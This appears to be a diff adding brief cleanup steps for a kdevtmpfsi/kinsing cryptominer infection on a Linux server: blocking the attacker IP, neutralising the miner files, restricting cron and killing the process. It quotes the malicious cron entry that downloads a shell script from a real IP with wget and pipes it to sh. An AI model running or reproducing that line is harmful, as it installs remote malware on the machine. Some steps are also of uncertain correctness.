@@ -1,0 +1,40 @@
+
+crontab -e 
+
+# REMOVE A SIMILAR LINE TO THIS
+* * * * * wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1
+
+
+
+
+
+ iptables -A INPUT --src 195.3.146.118 -j DROP
+
+
+chmod 000 /tmp/kdevtmpfsi
+chattr -iR /tmp/kdevtmpfsi
+
+
+chmod 000 /var/tmp/kinsing
+chattr -iR /var/tmp/kinsing
+
+
+touch /tmp/kdevtmpfsi && touch /var/tmp/kinsing
+echo "everything is good here" > /tmp/kdevtmpfsi
+echo "everything is good here" > /var/tmp/kinsing
+cat /tmp/kdevtmpfsi && cat /var/tmp/kinsing
+
+
+chmod go-rwx /var/tmp
+chmod 1777 /tmp
+
+echo "root" > /etc/cron.allow
+
+
+ps -ef | grep kdevtmpfsi 
+	-> me da el process ID
+	
+kill -9 PROCESS_ID
+
+reboot now
+  
